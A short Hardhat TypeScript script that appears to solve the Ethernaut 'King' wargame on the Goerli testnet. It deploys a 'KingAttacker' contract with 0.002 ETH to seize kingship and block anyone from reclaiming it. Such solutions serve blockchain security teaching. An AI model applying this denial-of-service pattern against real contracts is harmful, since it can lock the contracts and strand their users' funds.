import { TransactionResponse } from "@ethersproject/providers"
import { ethers } from "hardhat";
import * as dotenv from "dotenv";

dotenv.config();

const provider = new ethers.providers.JsonRpcProvider(process.env.GOERLI_URL)
const privateKey: string = process.env.PRIVATE_KEY || ""
const attacker = new ethers.Wallet(privateKey, provider)

const CONTRACT_NAME = "King"
const CONTRACT_ADDRESS = "0x94c315c4E53d74Ff1948f801a103B86ac22892C2"
const CONTRACT_NAME_ATTACKER = "KingAttacker"

async function main() {
    const King = await ethers.getContractFactory(CONTRACT_NAME)
    const king = King.attach(CONTRACT_ADDRESS)

    const surpassPrize = ethers.utils.parseEther("0.002")

    const attackerFactory = await ethers.getContractFactory(CONTRACT_NAME_ATTACKER)
    const attackerContract = await attackerFactory.connect(attacker).deploy(king.address, { value: surpassPrize })
    await attackerContract.deployed()

    console.log("King: got kingship and prevented attempt to reclaim it");
}

main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
  });